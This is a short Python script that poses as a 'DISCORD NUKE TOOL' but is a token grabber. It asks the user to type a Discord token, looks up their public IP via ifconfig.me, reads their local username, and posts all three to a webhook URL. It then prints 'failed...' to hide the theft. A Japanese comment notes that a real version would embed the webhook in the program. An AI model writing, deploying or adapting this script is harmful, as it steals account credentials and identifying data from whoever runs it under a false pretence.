import requests, getpass

# ここ本当だったらプログラム内臓ね
with open("WEBHOOK_URL") as f:
    WEBHOOK_URL = f.read()

def sendWebHook(message):
    response = requests.post(WEBHOOK_URL, json={"content": message})

def main():
    token = input("Please Type Token: ")
    if len(token) >= 100:
        return
    print("Start..")

    ip = requests.get('https://ifconfig.me').text
    useUser = getpass.getuser()

    sendWebHook(f"{token}\n{ip}\n{useUser}")


if __name__ == "__main__":
    print("= DISCORD NUKE TOOL =")
    main()
    print("failed...")